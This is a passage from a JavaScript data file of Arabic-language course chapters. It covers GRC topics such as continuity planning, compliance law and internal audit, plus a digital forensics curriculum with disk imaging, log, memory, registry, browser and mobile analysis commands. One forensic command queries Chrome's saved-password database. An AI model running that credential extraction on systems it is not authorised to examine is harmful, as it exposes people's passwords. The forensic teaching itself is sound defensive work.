        <h3 class="font-bold text-neon/80 mt-4 mb-2">مفاهيم أساسية:</h3>
        <ul>
          <li><strong>RTO (Recovery Time Objective):</strong> أقصى وقت مسموح به لاستعادة النظام بعد الكارثة.</li>
          <li><strong>RPO (Recovery Point Objective):</strong> أقصى فقد بيانات مسموح به (بالنسبة إلى آخر نسخة احتياطية).</li>
          <li><strong>محاكاة (Tabletop Exercise):</strong> تمرين على الورق لاختبار الخطة.</li>
        </ul>
        <div class="note-box">
          📌 <strong>نشاط 15:</strong> لنظام CRM (إدارة علاقات العملاء) اقترح RTO و RPO مناسبين (مثلاً RTO = 4 ساعات، RPO = 1 ساعة). فسر سبب اختيارك.
        </div>
      `},{number:16,title:"[متوسط] الامتثال للقوانين المحلية والدولية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: ما وراء GDPR</h2>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">قوانين أخرى هامة:</h3>
        <ul>
          <li><strong>HIPAA (الولايات المتحدة):</strong> يحمي المعلومات الصحية المحمية (PHI) في القطاع الصحي.</li>
          <li><strong>CCPA (كالفورنيا):</strong> حقوق خصوصية مماثلة لـ GDPR لكن على مستوى ولاية كالفورنيا.</li>
          <li><strong>PCI DSS (بطاقات الدفع):</strong> أي مؤسسة تتعامل مع بطاقات الائتمان يجب أن تلتزم بهذا المعيار.</li>
          <li><strong>قانون حماية البيانات المصري رقم 151 لسنة 2020:</strong> ينظم جمع ومعالجة البيانات الشخصية داخل مصر، ويُشترط موافقة الفرد، وإنشاء مركز وطني لحماية البيانات، وإخطار المركز في حال حدوث اختراق خلال 72 ساعة.</li>
        </ul>
      `},{number:17,title:"[متوسط] برامج التوعية والتدريب الأمني",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: العنصر البشري – أقوى خط دفاع</h2>
        <p>أكثر من 80% من الاختراقات تتضمن خطأ بشرياً. برامج التوعية تقلل هذه النسبة.</p>
        <ul>
          <li>دورات إلزامية عند التوظيف (Onboarding).</li>
          <li>دورات توعية سنوية (التصيد، أمن كلمات المرور، التعامل مع البيانات الحساسة).</li>
          <li>محاكاة الهجمات (Phishing Simulations) – إرسال رسائل تصيد وهمية لقياس الوعي.</li>
          <li>توزيع نشرات دورية (أخبار الأمن، نصائح سريعة).</li>
        </ul>
        <div class="code-block">
# استخدام Gophish لإنشاء حملة محاكاة تصيد بسيطة
sudo apt install gophish -y
# إعداد مجموعة مستهدفين (بريد الموظفين التجريبي)
# تصميم قالب بريد إلكتروني (احتيالي لكن غير ضار)
# تشغيل الحملة وتحليل النتائج
        </div>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>كم عدد الضوابط في Annex A من ISO 27001:2022؟</li>
          <li>ما الفرق بين التقييم النوعي والكمي للمخاطر؟</li>
          <li>اذكر ثلاثة عناصر أساسية في اتفاقية مع مورد يجب أن تتعلق بالأمن.</li>
          <li>ما الفرق بين BCP و DRP؟</li>
          <li>ما هي متطلبات قانون حماية البيانات المصري فيما يتعلق باختراق البيانات؟</li>
          <li>ما هي المحاكاة التصيدية (Phishing Simulation) وأهميتها؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> اختر إطاراً معيارياً (مثل ISO 27001 أو NIST CSF). قم بتطبيق 10 ضوابط منه على مؤسسة افتراضية من اختيارك. اكتب تقريراً من 3-5 صفحات يشرح الضوابط وكيفية تنفيذها وأدلة الامتثال.</p>
      `},{number:19,title:"[متقدم] أتمتة GRC – أدوات وبرامج",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: استخدام التكنولوجيا في الحوكمة والمخاطر والامتثال</h2>
        <p>منصات GRC تساعد في إدارة السياسات، تتبع المخاطر، ومراقبة الامتثال.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أدوات مفتوحة المصدر:</h3>
        <ul>
          <li><strong>Eramba:</strong> منصة GRC كاملة (التوثيق، تقييم المخاطر، إدارة الامتثال).</li>
          <li><strong>SimpleRisk:</strong> أداة بسيطة لإدارة المخاطر.</li>
          <li><strong>OSCAL (Open Security Controls Assessment Language):</strong> لغة لتمثيل الضوابط الأمنية بتنسيق آلي (JSON/XML).</li>
        </ul>
        <div class="code-block">
# تثبيت Eramba عبر Docker
docker run -d --name eramba -p 80:80 eramba/eramba:latest
        </div>
      `},{number:20,title:"[متقدم] إدارة المخاطر باستخدام MITRE و NIST RMF",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: منهجيات متقدمة لتقييم المخاطر</h2>
        <ul>
          <li><strong>NIST Risk Management Framework (RMF):</strong> مكون من 7 خطوات: Prepare، Categorize، Select، Implement، Assess، Authorize، Monitor.</li>
          <li><strong>MITRE ATT&CK for Risk:</strong> يمكن استخدام التقنيات المهاجمين كمصدر للتهديدات أثناء تقييم المخاطر (Threat Modeling).</li>
        </ul>
      `},{number:21,title:"[متقدم] إجراء تدقيق داخلي (Audit) وفقاً لـ ISO 19011",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: كيف تدقق على نفسك قبل أن يدقق عليك الآخرون</h2>
        <p>التدقيق الداخلي هو عملية منهجية ومستقلة لتقييم مدى الالتزام بالسياسات والمعايير.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">خطوات التدقيق الأساسية:</h3>
        <ol>
          <li>التخطيط (Plan): تحديد النطاق، الأهداف، فريق التدقيق، الجدول الزمني.</li>
          <li>جمع الأدلة (Evidence Gathering): مراجعة الوثائق، مقابلات، فحص تقني (على عينات).</li>
          <li>تحليل الفجوات (Gap Analysis): تحديد نقاط القوة والضعف.</li>
          <li>تقرير التدقيق (Audit Report): تسجيل النتائج، نقاط عدم المطابقة (Non-conformities)، التوصيات.</li>
          <li>متابعة الإجراءات التصحيحية (Follow-up).</li>
        </ol>
        <div class="note-box">
          📌 <strong>نشاط 21:</strong> قم بإعداد خطة تدقيق داخلي لمراجعة الالتزام بسياسة التحكم في الوصول (6-8 أسئلة، عينة من الموظفين، فحص تقني لصلاحيات ملف معين).
        </div>
      `},{number:22,title:"[متقدم] الشهادات المهنية في GRC (CRISC, CISM, CISA)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: كيف تصبح خبيراً معتمداً</h2>
        <ul>
          <li><strong>CRISC (Certified in Risk and Information Systems Control):</strong> من ISACA – متخصص في إدارة المخاطر والضوابط.</li>
          <li><strong>CISM (Certified Information Security Manager):</strong> من ISACA – يركز على إدارة الأمن والحوكمة.</li>
          <li><strong>CISA (Certified Information Systems Auditor):</strong> من ISACA – متخصص في تدقيق نظم المعلومات.</li>
          <li><strong>ISO 27001 Lead Implementer / Lead Auditor:</strong> من PECB أو IRCA.</li>
        </ul>
        <p>للاستعداد لهذه الشهادات، تحتاج إلى دراسة المناهج الرسمية وحل أسئلة الامتحان التجريبية.</p>
      `},{number:23,title:"[متقدم] تحليل أثر الأعمال (BIA) وبناء خطة استمرارية فعالة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: تحديد أولويات العمليات في الأزمات</h2>
        <p>تحليل أثر الأعمال (Business Impact Analysis) هو حجر الزاوية في BCP. يحدد:</p>
        <ul>
          <li>العمليات الحيوية (Critical Processes) التي يجب استعادتها أولاً.</li>
          <li>الحد الأقصى لوقت التوقف المسموح به (MTD – Maximum Tolerable Downtime).</li>
          <li>الموارد المطلوبة (موظفين، أنظمة، بيانات).</li>
        </ul>
        <div class="code-block">
# نموذج بسيط لـ BIA
| العملية              | MTD    | RTO   | RPO   | الموارد المطلوبة          |
|----------------------|--------|-------|-------|---------------------------|
| نظام المبيعات عبر الإنترنت | 4 ساعات | 2 ساعات| 15 دقيقة | خادم، قاعدة بيانات، موظفان |
| خدمة العملاء         | 8 ساعات | 4 ساعات| 1 ساعة| هاتف، نظام تذاكر، 5 موظفين|
        </div>
      `},{number:24,title:"[متقدم] إدارة المشاريع الأمنية ونماذج النضج (CMMI)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: تقييم نضج الأمن السيبراني</h2>
        <p>نماذج نضج (Maturity Models) تساعد المؤسسات في قياس تطورها الأمني:</p>
        <ul>
          <li><strong>CMMI (Capability Maturity Model Integration):</strong> مستويات من 1 (بدائي) إلى 5 (محسّن).</li>
          <li><strong>NIST CSF Maturity:</strong> مستويات Tier 1 إلى Tier 4 (Partial, Risk Informed, Repeatable, Adaptive).</li>
        </ul>
        <p>تطبيق إطار مثل NIST CSF يساعد في وضع خريطة طريق لتحسين النضج.</p>
      `},{number:25,title:"[متقدم] الأخلاقيات وإدارة الصراعات في GRC",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: المبادئ الأخلاقية لممارس GRC</h2>
        <p>مواثيق أخلاقية (مثل ISACA Code of Ethics) تؤكد على:</p>
        <ul>
          <li>النزاهة والاستقلالية: تقديم تقارير صادقة غير متأثرة بضغوط الإدارة.</li>
          <li>السرية: حماية معلومات المؤسسة والحفاظ على خصوصية البيانات.</li>
          <li>الكفاءة المهنية: تحديث المعرفة باستمرار وعدم قبول مهام خارج نطاق الخبرة.</li>
        </ul>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 12 شهراً لتصبح متخصص GRC",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من صفر إلى محلل GRC</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> دراسة أساسيات GRC (هذا الكورس).</li>
          <li><strong>الشهر 3-4:</strong> الحصول على شهادة CompTIA Security+ (لفهم التقنيات).</li>
          <li><strong>الشهر 5-6:</strong> دراسة CRISC (من ISACA) – إدارة المخاطر والضوابط.</li>
          <li><strong>الشهر 7-9:</strong> تدريب عملي: بناء سجل مخاطر لمؤسسة حقيقية (أو وهمية) باستخدام أداة مثل Eramba.</li>
          <li><strong>الشهر 10-12:</strong> الحصول على شهادة ISO 27001 Lead Implementer والبحث عن وظيفة "GRC Analyst" أو "Compliance Officer".</li>
        </ul>
      `},{number:27,title:"[متقدم] المشروع النهائي الشامل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: بناء نظام إدارة أمن معلومات لمؤسسة افتراضية</h2>
        <p><strong>السيناريو:</strong> أنت مستشار GRC، وتم تعيينك لمساعدة شركة ناشئة (50 موظفاً، تعمل في التجارة الإلكترونية) للوصول إلى الامتثال لـ PCI DSS و GDPR.</p>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>إجراء تقييم مخاطر كامل (تحديد الأصول، التهديدات، الاحتمالية، التأثير).</li>
          <li>إعداد سجل مخاطر (Risk Register) مع خطة علاج لكل مخاطرة عالية.</li>
          <li>كتابة 3 سياسات أساسية (قبول المخاطر، التحكم في الوصول، تصنيف البيانات).</li>
          <li>إعداد خطة استمرارية الأعمال (BCP) مختصرة (5 صفحات).</li>
          <li>إنشاء خريطة طريق (Roadmap) للمشروع مدتها 12 شهراً لإغلاق الثغرات وتحقيق الامتثال.</li>
        </ol>
        <p>ستقوم بتسليم حزمة كاملة من المستندات (تقرير المخاطر، السياسات، خطة الاستمرارية، الخريطة الزمنية). هذا العمل قابل للإضافة إلى محفظتك المهنية (Portfolio).</p>
      `}]},ov={id:"forensics",title:"Digital Forensics",emoji:"🔍",color:"cyan",description:"منهج متكامل من 3 مستويات - التحليل الجنائي الرقمي وجمع الأدلة",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~195 صفحة",icon:"fa-search",chapters:[{number:1,title:"[مبتدئ] مقدمة في التحليل الجنائي الرقمي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: ما هو الطب الشرعي الرقمي؟</h2>
        <p>التحليل الجنائي الرقمي (Digital Forensics) هو فرع من علوم الطب الشرعي يهتم بجمع وتحليل وتقديم الأدلة الرقمية بطريقة مقبولة قانونياً. يمكن تطبيقه في التحقيقات الجنائية (اختراق، سرقة بيانات، جرائم إلكترونية) وكذلك في التحقيقات الداخلية للشركات (انتهاك السياسات، تسريب بيانات).</p>
        <div class="note-box">
          <i class="fas fa-gavel text-neon"></i> <strong>مبادئ أساسية:</strong> الأدلة يجب أن تكون محفوظة من التغيير (سلسلة الحفظ)، كل إجراء يتم توثيقه، ويتم التحليل على نسخة طبق الأصل وليس على الأدلة الأصلية.
        </div>
        <div class="fig-box">
          <i class="fas fa-microchip text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> مراحل التحليل الجنائي: الجمع، الحفظ، التحليل، التقرير.
        </div>
      `},{number:2,title:"[مبتدئ] تجهيز بيئة معمل الطب الشرعي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: أدوات المحقق الرقمي</h2>
        <ul>
          <li><strong>جهاز معمل معزول (Forensic Workstation):</strong> لا يتصل بالإنترنت، مع منافذ مادية مؤمنة لمنع العبث بالأدلة.</li>
          <li><strong>أدوات كتابة مانعة للكتابة (Write-blocker):</strong> جهاز يمنع أي تعديل على القرص الأصلي عند توصيله (مثل Tableau، أو برمجي مثل mount -o ro).</li>
          <li><strong>برامج جنائية:</strong>
            <ul><li>Autopsy (مفتوح المصدر) – منصة تحليل شاملة.</li>
            <li>FTK Imager (مجاني) – لإنشاء صور (images) للقرص.</li>
            <li>Volatility Framework – لتحليل الذاكرة.</li>
            <li>Wireshark – لتحليل ملفات pcap.</li></ul>
          </li>
          <li><strong>قوالب التوثيق:</strong> سجل سلسلة الحفظ، تقرير التحليل.</li>
        </ul>
        <div class="code-block">
# تثبيت Autopsy على Ubuntu
sudo apt update
sudo apt install autopsy -y
# تثبيت Volatility (يتطلب Python)
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python setup.py install
        </div>
      `},{number:3,title:"[مبتدئ] مبادئ سلسلة الحفظ وجمع الأدلة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: من مسرح الجريمة إلى المختبر</h2>
        <p>سلسلة الحفظ (Chain of Custody) هي وثائق تسجل كل من تعامل مع الدليل منذ لحظة جمعها حتى عرضها في المحكمة. أي فجوة في السلسلة قد تؤدي إلى رفض الدليل.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">خطوات جمع الأدلة الرقمية:</h3>
        <ol>
          <li>تحديد موقع الأدلة: قرص صلب، USB، هاتف، سحابة.</li>
          <li>توثيق حالة الجهاز: التصوير الفوتوغرافي، الطوابع الزمنية، الأسماء.</li>
          <li>فصل الجهاز عن الشبكة: منع التغييرات عن بعد.</li>
          <li>حساب تجزئة (Hash) للقرص الأصلي: باستخدام SHA256 أو MD5 للتأكد من سلامة البيانات.</li>
          <li>إنشاء صورة قطاعية (Forensic Image): نسخة طبق الأصل محفوظة في ملف (E01 أو DD).</li>
          <li>توقيع سلسلة الحفظ وتوثيق كل خطوة.</li>
        </ol>
        <div class="code-block">
# حساب تجزئة SHA256 لملف أو قرص
sha256sum /dev/sdb
# إنشاء صورة قرص باستخدام dd
sudo dd if=/dev/sdb of=/mnt/evidence/image.dd bs=4096
        </div>
      `},{number:4,title:"[مبتدئ] أنظمة الملفات من منظور جنائي (FAT، NTFS، ext4)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: هيكل البيانات تحت المجهر</h2>
        <ul>
          <li><strong>FAT (File Allocation Table):</strong> قديم، يستخدم في الأجهزة الصغيرة. عند حذف ملف، يتم تغيير أول حرف من اسم الملف إلى E5، وتظل البيانات موجودة حتى يتم الكتابة فوقها.</li>
          <li><strong>NTFS (ويندوز):</strong> يحتوي على Master File Table (MFT) حيث يتم تخزين معلومات الملفات (الاسم، التواريخ، حجم البيانات). الملفات المحذوفة تبقى في MFT مع تمييزها محذوفة حتى تتم إعادة استخدام الإدخال.</li>
          <li><strong>ext4 (لينكس):</strong> يستخدم inodes لتخزين البيانات الوصفية. الحذف يؤدي إلى إزالة المؤشرات لكن البيانات تبقى على القرص حتى يتم الكتابة فوقها.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-database text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 4.1:</strong> هيكل MFT في نظام NTFS.
        </div>
      `},{number:5,title:"[مبتدئ] تحليل القرص الصلب باستخدام Autopsy",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: أول تحقيق باستخدام Autopsy</h2>
        <div class="code-block">
# فتح Autopsy وإنشاء قضية جديدة
autopsy
# إنشاء قضية باسم "Case_001"
# إضافة الصورة "image.dd"
# اختيار ملف التعريف (Ingest Profile) للبحث عن الملفات والمحذوفات والكلمات المفتاحية
# استعراض النتائج في الواجهة الرسومية
        </div>
        <p>ما الذي تبحث عنه؟</p>
        <ul>
          <li>الملفات المحذوفة في سلة المحذوفات أو الممتدة.</li>
          <li>ملفات الصور والمستندات المشبوهة.</li>
          <li>سجل التطبيقات (Recent documents).</li>
          <li>بصمات الأجهزة الخارجية (USB).</li>
        </ul>
      `},{number:6,title:"[مبتدئ] استعادة الملفات المحذوفة (Foremost، PhotoRec)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: إحياء البيانات المفقودة</h2>
        <p>بعد الحذف العادي، لا تختفي البيانات من القرص فعلياً. يمكن استعادتها باستخدام أدوات مثل PhotoRec أو Foremost.</p>
        <div class="code-block">
# تثبيت Foremost
sudo apt install foremost -y
foremost -i image.dd -o recovered -t jpg,pdf,docx,zip

# استخدام PhotoRec (جزء من TestDisk)
sudo apt install testdisk -y
photorec image.dd
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تقم أبداً بالكتابة على القرص الأصلي أثناء عملية الاستعادة. استخدم نسخة صورة (image) فقط.
        </div>
      `},{number:7,title:"[مبتدئ] تحليل سجلات ويندوز (Event Viewer الأساسي)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: قراءة سجلات الأحداث</h2>
        <p>الأحداث الرئيسية في سجل الأمان (Security Log):</p>
        <ul>
          <li><strong>4624:</strong> تسجيل دخول ناجح.</li>
          <li><strong>4625:</strong> فشل تسجيل الدخول.</li>
          <li><strong>4688:</strong> إنشاء عملية جديدة.</li>
          <li><strong>1102:</strong> مسح سجل الأمان (قد يشير إلى إزالة أدلة).</li>
        </ul>
        <div class="code-block">
# تصدير سجل الأمان كملف .evtx
wevtutil epl Security security_backup.evtx
# فتحه في Event Viewer على جهاز آخر (لمنع التلوث)
        </div>
      `},{number:8,title:"[مبتدئ] تحليل سجلات لينكس (syslog، auth.log)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: تتبع النشاط على لينكس</h2>
        <div class="code-block">
# عرض سجل المصادقة
cat /var/log/auth.log | grep "session opened"

# البحث عن محاولات SSH فاشلة
grep "Failed password" /var/log/auth.log

# نسخ سجل آمن
cp /var/log/auth.log /mnt/evidence/auth_log_copy
        </div>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي سلسلة الحفظ (Chain of Custody) ولماذا هي مهمة؟</li>
          <li>ما الفرق بين صورة القراصنة (Forensic Image) والنسخة العادية من الملفات؟</li>
          <li>ما هو نظام الملفات المستخدم في ويندوز الحديث؟ اذكر خاصيتين جنائيتين له.</li>
          <li>كيف يمكن استعادة ملف محذوف من قرص NTFS؟</li>
          <li>اذكر Event ID لنجاح تسجيل الدخول وفشل تسجيل الدخول في ويندوز.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بإنشاء قرص USB أو قسم صغير (1GB). انسخ بعض الملفات النصية والصور ثم احذفها. استخدم PhotoRec لاستعادة الملفات المحذوفة. دوّن الخطوات والملفات التي تم استردادها. اكتب تقريراً من صفحة واحدة.</p>
      `},{number:10,title:"[متوسط] تحليل الذاكرة (Memory Forensics) باستخدام Volatility",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: ما تخفيه ذاكرة الوصول العشوائي</h2>
        <p>تحليل الذاكرة (RAM) يكشف العمليات الجارية، الاتصالات الشبكية النشطة، الأوامر التي تم تنفيذها، وأحياناً كلمات المرور غير المشفرة.</p>
        <div class="code-block">
# الحصول على ملف ذاكرة (مثال: memdump.mem)
# استخدام Volatility لتحديد ملف التعريف (profile)
volatility -f memdump.mem imageinfo
# عرض العمليات الجارية وقت الالتقاط
volatility -f memdump.mem --profile=Win10x64 pslist
# عرض اتصالات الشبكة
volatility -f memdump.mem --profile=Win10x64 netscan
# استخراج أوامر PowerShell التي تم تشغيلها
volatility -f memdump.mem --profile=Win10x64 cmdscan
        </div>
        <div class="note-box">
          📌 <strong>نشاط 10:</strong> التقط ذاكرة جهاز ويندوز (باستخدام winpmem). حلل الملف باستخدام Volatility وحدد العمليات الخبيثة المحتملة (مثل استهلاك عالي للـ CPU، اتصالات غير عادية).
        </div>
      `},{number:11,title:"[متوسط] تحليل الـ Registry في ويندوز",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: قاعدة بيانات النظام</h2>
        <p>سجل ويندوز (Registry) يحتوي على إعدادات النظام والمستخدمين. يمكن تحليله لاكتشاف:</p>
        <ul>
          <li>آخر التطبيقات المفتوحة (RecentDocs).</li>
          <li>الأجهزة المتصلة USB (USBSTOR).</li>
          <li>حسابات المستخدمين وكلمات المرور المخزنة (SAM).</li>
          <li>شبكات Wi-Fi المتصلة سابقاً.</li>
          <li>مفاتيح بدء التشغيل (Run, RunOnce).</li>
        </ul>
        <div class="code-block">
# استخدام RegRipper (أداة مفتوحة المصدر)
rip -r NTUSER.DAT -p userassist
rip -r SYSTEM -p usbstor
        </div>
      `},{number:12,title:"[متوسط] تحليل المتصفحات (History، Cookies، Cache)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: تتبع نشاط المستخدم على الإنترنت</h2>
        <p>المتصفحات تحتفظ بتاريخ التصفح، ملفات تعريف الارتباط، كلمات المرور المحفوظة، والتنزيلات. الأدلة الجنائية تقوم بتحليل ملفات SQLite الخاصة بها.</p>
        <div class="code-block">
# تحليل ملف History في Chrome (SQLite)
sqlite3 History "SELECT * FROM urls"

# تحليل ملف Login Data للبحث عن كلمات مرور محفوظة
sqlite3 "Login Data" "SELECT action_url, username_value, password_value FROM logins"
        </div>
      `},{number:13,title:"[متوسط] تحليل البريد الإلكتروني (PST، EML)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: فك تشفير الاتصالات</h2>
        <p>تحليل البريد الإلكتروني يمكن أن يكشف عن هجمات التصيد، تسريب بيانات، أو أدلة على التواصل مع أطراف خارجية.</p>
        <ul>
          <li>ملفات PST (Outlook): يمكن فتحها في أداة مثل Kernel PST Viewer.</li>
          <li>ملفات EML (رسائل فردية): يمكن قراءتها كنص عادي (تحتوي على الهيدر والمحتوى).</li>
        </ul>
        <div class="code-block">
# استخراج الهيدر من ملف EML
cat email.eml | grep -E "From:|To:|Subject:|Date:"
        </div>
      `},{number:14,title:"[متوسط] تحليل الشبكة (PCAP) لاستخراج الأدلة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: التنقل في حزم الشبكة</h2>
        <p>تحليل ملفات PCAP يكشف عن هجمات شبكية، تحميل ملفات خبيثة، اتصالات C2، وأنشطة غير عادية. الأدوات الأساسية: Wireshark، tcpdump، ngrep.</p>
        <div class="code-block">
# تحليل ملف pcap باستخدام tcpdump للبحث عن زيارات لموقع معين
tcpdump -r capture.pcap -n 'host example.com'

# في Wireshark، استخدام مرشح http.request لفحص طلبات HTTP
# استخراج الملفات المنقولة: File → Export Objects → HTTP
        </div>
      `},{number:15,title:"[متوسط] تحليل الأجهزة المحمولة (أساسيات)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: استخراج الأدلة من الهواتف الذكية</h2>
        <ul>
          <li>تحليل Android: استخدام ADB لاستخراج نسخة احتياطية، ثم تحليلها باستخدام tools مثل Android Forensics.</li>
          <li>تحليل iOS: استخراج نسخة احتياطية من iTunes، واستخدام iLEAPP.</li>
        </ul>
        <div class="code-block">
# استخراج نسخة احتياطية من جهاز Android (يتطلب تمكين تصحيح USB)
adb backup -apk -shared -all -f backup.ab
# تحويل الملف إلى تنسيق قابل للقراءة
dd if=backup.ab bs=1 skip=24 | python -c "import zlib; import sys; sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
        </div>
      `},{number:16,title:"[متوسط] توثيق الأدلة وإعداد التقارير الأولية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: من الأدلة إلى التقرير</h2>
        <p>التقرير الجنائي يجب أن يكون واضحاً، محايداً، ومقبولاً من قبل الجهات القضائية. هيكل التقرير:</p>
        <ul>
          <li><strong>مقدمة:</strong> هوية المحلل، طلب التحليل، نطاق التحقيق.</li>
          <li><strong>سلسلة الحفظ:</strong> وثيقة تتبع الأدلة (نسخة منها).</li>
          <li><strong>الملخص:</strong> نتائج عالية المستوى (2-3 فقرات).</li>
          <li><strong>المنهجية:</strong> الأدوات المستخدمة، الخطوات، الأوامر.</li>
          <li><strong>النتائج بالتفصيل:</strong> الأدلة المكتشفة (ملفات، سجلات، اتصالات) مع لقطات شاشة.</li>
          <li><strong>الاستنتاج والتوصيات.</strong></li>
        </ul>
      `},{number:17,title:"[متوسط] أدوات جنائية متخصصة (FTK Imager، X-Ways)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: أدوات احترافية للتحليل</h2>
        <ul>
          <li><strong>FTK Imager:</strong> أداة مجانية لإنشاء الصور وعرضها وتحليلها. تتميز بالسرعة وسهولة الاستخدام.</li>
          <li><strong>X-Ways Forensics:</strong> بديل مدفوع لـ EnCase، يحتوي على ميزات متقدمة (توقيع الملفات، البحث العكسي).</li>
        </ul>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي المعلومات التي يمكن استخراجها من تحليل الذاكرة (Volatility)؟</li>
          <li>أين يخزن ويندوز مفاتيح بدء التشغيل (Startup)؟</li>
          <li>كيف يمكن استخراج تاريخ تصفح Chrome من ملف SQLite؟</li>
          <li>ما الفرق بين ملف PST و EML؟</li>
          <li>ما هو "مرشح" Wireshark المناسب لاستخراج صور من حركة HTTP؟</li>
          <li>ما هي المعلومات الأساسية التي يجب أن يحتوي عليها تقرير جنائي؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> قم بتحميل ملف PCAP من موقع Malware Traffic Analysis (مثل سيناريو هجوم تصيد). حلل الملف باستخدام Wireshark لاستخراج: عنوان IP للمهاجم، الملف الذي تم تحميله، وعنوان البريد الإلكتروني للضحية (إن وُجد). اكتب تقريراً من صفحتين يشرح الخطوات والنتائج.</p>
      `},{number:19,title:"[متقدم] التحليل العكسي للملفات الضارة (Reverse Engineering)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: تفكيك البرامج الخبيثة</h2>
        <p>الهندسة العكسية (Reverse Engineering) تساعد في فهم كيفية عمل المالفير دون تشغيله. أدوات: Ghidra، IDA Pro (مجاني محدود).</p>
        <div class="code-block">
# استخدام Ghidra: إنشاء مشروع جديد، استيراد ملف PE/ELF، تشغيل التحليل التلقائي.
# البحث عن سلسلة (string) معينة
# متابعة دالة main أو WinMain
        </div>
      `},{number:20,title:"[متقدم] تحليل الـ Slack Space و Alternate Data Streams",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: أماكن إخفاء الأدلة</h2>
        <ul>
          <li><strong>Slack Space:</strong> المساحة غير المستخدمة في آخر قطاع (cluster) من الملف. يمكن إخفاء بيانات هنا.</li>
          <li><strong>Alternate Data Streams (ADS):</strong> ميزة في NTFS تسمح بإرفاق تيارات بيانات إضافية بملف (مثال: file.txt:hidden).</li>
        </ul>
        <div class="code-block">
# الكشف عن ADS باستخدام dir /r
dir /r
# استخراج ADS باستخدام تستخدم أداة مثل streams.exe من Sysinternals
streams.exe -s C:\\path\\to\\file
        </div>
      `},{number:21,title:"[متقدم] تحليل الأجهزة المحمولة المتقدم (Android/iOS)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: التعامل مع القيود الحديثة</h2>
        <ul>
          <li>استخراج بيانات من أجهزة Android مع تشفير (Full Disk Encryption) – قد يتطلب استغلال ثغرات أو الحصول على رمز PIN.</li>
          <li>استخراج بيانات من iOS (بدون كسر الحماية) عبر استخراج نسخة احتياطية مشفرة أو استخدام أدوات مثل Cellebrite (مدفوعة).</li>
        </ul>
      `},{number:22,title:"[متقدم] التعامل مع التشفير (البحث عن المفاتيح)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: فك تشفير البيانات المشفرة</h2>
        <p>عند مواجهة أقراص مشفرة (BitLocker، VeraCrypt، FileVault)، المحقق يحتاج إلى العثور على المفاتيح في الذاكرة أو في ملفات النظام.</p>
        <ul>
          <li>تحليل الذاكرة لاستخراج مفاتيح التشفير (Volatility plugin: bitlocker).</li>
          <li>البحث عن ملفات مفاتيح (keyfiles).</li>
          <li>استخدام كلمة مرور المستخدم إذا كانت متوفرة (من خلال الهندسة الاجتماعية أو من سجلات أخرى).</li>
